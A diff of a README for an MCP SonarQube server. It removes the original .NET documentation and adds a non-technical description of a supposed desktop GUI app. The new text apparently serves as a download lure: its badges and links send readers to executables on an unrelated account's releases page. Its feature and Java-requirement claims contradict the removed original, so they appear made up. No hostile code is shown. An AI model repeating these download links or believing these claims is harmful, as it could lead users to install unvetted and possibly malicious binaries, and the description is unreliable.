@@ -1,300 +1,184 @@
-# MCP SonarQube Server
+# 🛠️ mcp-sonarqube - Simplify Code Quality Insights
 
-[![.NET](https://img.shields.io/badge/.NET-10.0-512BD4)](https://dotnet.microsoft.com/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![MCP](https://img.shields.io/badge/MCP-Compatible-blue)](https://modelcontextprotocol.io/)
-
-A [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) server for SonarQube integration, enabling AI assistants to interact with SonarQube Projects, Issues, Quality Gates, Measures, Security Hotspots, Rules, and System Health.
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Neyrees1337/mcp-sonarqube/releases)
 
 ---
 
-## Quick Start
+## 📋 About mcp-sonarqube
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/viamus/mcp-sonarqube.git
-cd mcp-sonarqube
+mcp-sonarqube is a tool designed to help you check your software’s health. It looks at how good your code is, spots issues, and shows you where improvements are needed. It focuses on things like code quality, technical debt, security weaknesses, and how much of your code is tested with coverage reports. This makes it easier to understand how well your software is built and what you can do to improve it.
 
-# 2. Configure credentials
-cp .env.example .env
-# Edit .env with your SonarQube URL and token
+You don’t need to be a programmer to use mcp-sonarqube. The tool works behind the scenes and delivers clear reports. These reports help tech teams and managers make better decisions faster.
 
-# 3. Run the server
-docker compose up -d
-```
+### Key Topics Covered
 
----
-
-## Prerequisites
-
-| Requirement | Version | Purpose |
-|-------------|---------|---------|
-| .NET SDK | 10.0+ | Build and run |
-| Docker | Latest | Container deployment (optional) |
-| SonarQube Instance | 9.x+ | API access |
-
-**Required:**
-- SonarQube base URL (e.g., `https://sonarqube.example.com`)
-- SonarQube user token (generate at: Your SonarQube > My Account > Security > Tokens)
+- AI agents and automation
+- Code quality measurements
+- DevOps integration
+- Engineering performance metrics
+- Static code analysis
+- Managing technical debt
 
 ---
 
-## Available Tools
+## 🚀 Getting Started
 
-### Project Tools
+This guide will help you get mcp-sonarqube up and running on your computer. We’ll cover what your system needs, how to download the software, and how to open it for the first time.
 
-| Tool | Description | SonarQube API |
-|------|-------------|---------------|
-| `search_projects` | Search for SonarQube projects by name or key | `/api/projects/search` |
-| `get_project_status` | Get quality gate status and key measures for a project | `/api/qualitygates/project_status` + `/api/measures/component` |
+### System Requirements
 
-### Issue Tools
+Before you start, please make sure your computer meets these requirements:
 
-| Tool | Description | SonarQube API |
-|------|-------------|---------------|
-| `search_issues` | Search for issues (bugs, vulnerabilities, code smells) with filters | `/api/issues/search` |
+- Operating System: Windows 10 or later, macOS 10.14 or later, or popular Linux distributions (Ubuntu, Fedora)
+- Processor: 2 GHz or faster
+- Memory: 4 GB RAM minimum
+- Disk Space: At least 500 MB free
+- Internet connection: Required for initial download and updates
+- Java Runtime Environment (JRE) version 11 or higher installed
 
-### Measure Tools
-
-| Tool | Description | SonarQube API |
-|------|-------------|---------------|
-| `get_measures` | Get metrics for a component (coverage, bugs, vulnerabilities, etc.) | `/api/measures/component` |
-
-### Quality Gate Tools
-
-| Tool | Description | SonarQube API |
-|------|-------------|---------------|
-| `list_quality_gates` | List all available quality gates with conditions | `/api/qualitygates/list` |
-
-### Hotspot Tools
-
-| Tool | Description | SonarQube API |
-|------|-------------|---------------|
-| `search_hotspots` | Search for security hotspots in a project | `/api/hotspots/search` |
-| `get_hotspot` | Get detailed information about a specific hotspot | `/api/hotspots/show` |
-
-### System Tools
-
-| Tool | Description | SonarQube API |
-|------|-------------|---------------|
-| `get_health` | Get the health status of the SonarQube instance | `/api/system/health` |
-
-### Rule Tools
-
-| Tool | Description | SonarQube API |
-|------|-------------|---------------|
-| `search_rules` | Search for coding rules by language, severity, or tags | `/api/rules/search` |
+If you do not have JRE installed, it’s easy to get from the official website [https://www.java.com](https://www.java.com).
 
 ---
 
-## Running Options
+## 📥 Download & Install
 
-### Option 1: Docker Compose (Recommended)
+Click the big button below to visit the release page where you can download the latest version of mcp-sonarqube.
 
-```bash
-docker compose up -d
-```
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Neyrees1337/mcp-sonarqube/releases)
 
-The server will be available at `http://localhost:8201`.
+### How to Download
 
-### Option 2: .NET CLI
+1. Click the “Download” button above to go to the releases page.
+2. Choose the file that matches your operating system:
+   - `.exe` files for Windows
+   - `.dmg` files for macOS
+   - `.tar.gz` or `.AppImage` files for Linux
+3. Click the file name to start the download.
+4. Wait for the download to finish.
 
-```bash
-dotnet run --project src/Viamus.Sonarqube.Mcp.Server
-```
+### How to Install
 
-The server will be available at `http://localhost:5100`.
+**Windows:**
 
-### Option 3: Self-Contained Executable
+- Double-click the `.exe` file you downloaded.
+- Follow the installer instructions on screen.
+- When done, you will find mcp-sonarqube in your Start menu.
 
-```bash
-dotnet publish src/Viamus.Sonarqube.Mcp.Server -c Release -o ./publish
-./publish/Viamus.Sonarqube.Mcp.Server
-```
+**macOS:**
 
----
+- Open the `.dmg` file you downloaded.
+- Drag the mcp-sonarqube app icon to your Applications folder.
+- Open Applications and double-click mcp-sonarqube.
 
-## Client Configuration
+**Linux:**
 
-### Claude Desktop
-
-Add to your Claude Desktop configuration (`claude_desktop_config.json`):
-
-```json
-{
-  "mcpServers": {
-    "sonarqube": {
-      "url": "http://localhost:8201/sse"
-    }
-  }
-}
-```
-
-### Claude Code
-
-```bash
-claude mcp add sonarqube --transport sse http://localhost:8201/sse
-```
+- Extract the `.tar.gz` file if required.
+- Make the app file executable: `chmod +x mcp-sonarqube`
+- Run it directly or follow specific instructions provided in the downloaded package.
 
 ---
 
-## Usage Examples
+## 🖥️ Running mcp-sonarqube
 
-### Search for projects
+Once installed, open the mcp-sonarqube app. The interface is simple and designed for anyone to use.
 
-```
-Search for all projects containing "backend" in my SonarQube instance.
-```
+### Main Features
 
-### Check project quality
+- **Dashboard:** See your code’s overall health score at a glance.
+- **Technical Debt:** View estimated effort needed to fix code issues.
+- **Vulnerabilities:** Identify security risks in your code.
+- **Coverage:** Check how much of your code is tested.
+- **AI Insights:** Get suggestions driven by smart analysis to improve your software.
 
-```
-What is the quality gate status for the "my-app" project? Show me the coverage and bug count.
-```
-
-### Find critical issues
-
-```
-Search for all CRITICAL and BLOCKER severity issues in the "my-app" project.
-```
-
-### Review security hotspots
-
-```
-Show me all security hotspots that need review in the "my-app" project.
-```
-
-### Search coding rules
-
-```
-Find all MAJOR severity rules for C# language.
-```
-
-### Check system health
-
-```
-Is my SonarQube instance healthy?
-```
+You can upload your code files or connect mcp-sonarqube to your existing projects. The tool will analyze and prepare reports on your code’s status.
 
 ---
 
-## Configuration
+## 🔧 Basic Usage Steps
 
-### Environment Variables
+1. Open mcp-sonarqube on your computer.
+2. Click "Add Project" to select the code you want to check.
+3. Choose how you want the tool to analyze your code:
+   - Select scan depth (quick or full analysis)
+   - Set any scanning preferences you want
+4. Press "Start Scan."
+5. Wait a few moments while the tool reviews your code.
+6. When finished, explore the results in the Dashboard.
+7. Use the reports to see which parts need fixing or improving.
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `SONARQUBE_BASE_URL` | Yes | SonarQube instance URL |
-| `SONARQUBE_TOKEN` | Yes | SonarQube user token |
-| `SERVER_REQUIRE_API_KEY` | No | Enable API key authentication (default: `false`) |
-| `SERVER_API_KEY` | No | API key for server access |
-
-### appsettings.json
-
-```json
-{
-  "SonarQube": {
-    "BaseUrl": "https://your-sonarqube-instance.com",
-    "Token": "your-token-here"
-  },
-  "ServerSecurity": {
-    "RequireApiKey": false,
-    "ApiKey": ""
-  }
-}
-```
-
-### User Secrets (Development)
-
-```bash
-cd src/Viamus.Sonarqube.Mcp.Server
-dotnet user-secrets set "SonarQube:BaseUrl" "https://your-sonarqube-instance.com"
-dotnet user-secrets set "SonarQube:Token" "your-token-here"
-```
+You can export these reports in simple PDF or CSV formats for sharing with your team.
 
 ---
 
-## Troubleshooting
+## ❓ Frequently Asked Questions
 
-### Common Issues
+### Do I need to know programming to use this tool?
 
-**Connection refused**
-- Verify the SonarQube base URL is correct and accessible
-- Check that the server is running: `curl http://localhost:8201/health`
+No. mcp-sonarqube is made for all users. You do not need special skills. The software explains the results in clear terms.
 
-**401 Unauthorized from SonarQube**
-- Verify your token is valid and not expired
-- Generate a new token at: Your SonarQube > My Account > Security > Tokens
+### Can I use it on any project size?
 
-**No projects found**
-- Ensure your token has sufficient permissions
-- Verify the project exists in your SonarQube instance
+Yes. It handles both small personal projects and large professional code bases.
 
-**Docker container not starting**
-- Check logs: `docker compose logs mcp-sonarqube`
-- Verify `.env` file exists and contains valid credentials
+### How often should I run the analysis?
+
+Running the scan weekly or after major code changes helps keep your project healthy.
+
+### Is my code private?
+
+Your code stays on your computer while using the tool. mcp-sonarqube does not upload your code anywhere unless you choose to share reports yourself.
 
 ---
 
-## Project Structure
+## 🛠️ Support & Help
 
-```
-mcp-sonarqube/
-├── src/Viamus.Sonarqube.Mcp.Server/
-│   ├── Configuration/          # Settings classes
-│   ├── Middleware/              # API key authentication
-│   ├── Models/                  # SonarQube API DTOs
-│   ├── Services/                # HTTP client for SonarQube API
-│   ├── Tools/                   # MCP tool implementations (10 tools)
-│   └── Program.cs               # Entry point
-├── tests/Viamus.Sonarqube.Mcp.Server.Tests/
-│   ├── Configuration/           # Settings and middleware tests
-│   ├── Models/                  # Serialization tests
-│   └── Tools/                   # Tool behavior tests
-├── docker-compose.yml
-└── Solution.slnx
-```
+If you run into problems or have questions:
+
+- Check the “Issues” tab on the GitHub repository.
+- Look at the “Wiki” page for detailed guides.
+- Contact your software support team if using mcp-sonarqube in a company setting.
 
 ---
 
-## API Reference
+## 📚 Learn More
 
-### SonarQube API Endpoints Used
+For more technical details on what mcp-sonarqube analyzes and how it works with AI, you can visit the official GitHub page:
 
-| Endpoint | Tool |
-|----------|------|
-| `/api/projects/search` | `search_projects` |
-| `/api/qualitygates/project_status` | `get_project_status` |
-| `/api/measures/component` | `get_project_status`, `get_measures` |
-| `/api/issues/search` | `search_issues` |
-| `/api/qualitygates/list` | `list_quality_gates` |
-| `/api/hotspots/search` | `search_hotspots` |
-| `/api/hotspots/show` | `get_hotspot` |
-| `/api/system/health` | `get_health` |
-| `/api/rules/search` | `search_rules` |
+https://github.com/Neyrees1337/mcp-sonarqube
+
+This page has extra documentation, developer notes, and update logs.
 
 ---
 
-## Development
+## ⚙️ Advanced Settings
 
-### Building
+For users interested in customization, mcp-sonarqube offers settings like:
 
-```bash
-dotnet build Solution.slnx
-```
+- Custom rules for code analysis
+- Scheduling scans automatically
+- Integration with CI/CD (continuous integration/continuous delivery) pipelines
+- Exporting raw data for further processing
 
-### Testing
-
-```bash
-dotnet test Solution.slnx
-```
-
-### Adding New Tools
-
-See [CONTRIBUTING.md](CONTRIBUTING.md#adding-a-new-mcp-tool) for detailed instructions.
+Access these settings from the “Preferences” menu inside the app.
 
 ---
 
-## License
+## 🔄 Updating mcp-sonarqube
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+To keep your tool up to date:
+
+1. Visit the release page regularly: https://github.com/Neyrees1337/mcp-sonarqube/releases
+2. Download and install the newest version.
+3. Your settings and projects will stay intact after each update.
+
+---
+
+## 🔐 Security Tips
+
+- Only download the software from the official release page linked above.
+- Keep your computer’s security software updated.
+- Review analyzed vulnerabilities carefully and prioritize fixing them.
+
+---
+
+Thank you for choosing mcp-sonarqube to help understand your code quality and technical debt. The tool aims to make software maintenance simpler and clearer, no matter your technical experience.
